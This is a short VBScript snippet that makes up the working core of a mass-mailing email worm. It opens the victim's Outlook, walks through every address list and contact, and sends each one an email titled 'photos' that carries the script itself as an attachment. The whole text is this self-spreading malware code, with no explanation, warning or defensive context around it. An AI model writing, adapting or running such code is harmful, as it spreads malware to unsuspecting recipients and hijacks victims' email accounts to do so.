Set app = CreateObject("Outlook.Application")
Set ns = app.GetNamespace("MAPI")
For i = 1 To ns.AddressLists.Count
  Set lst = ns.AddressLists(i)
  For j = 1 To lst.AddressEntries.Count
    Set itm = app.CreateItem(0)
    itm.Recipients.Add lst.AddressEntries(j).Address
    itm.Subject = "photos"
    itm.Attachments.Add WScript.ScriptFullName
    itm.Send
  Next
Next
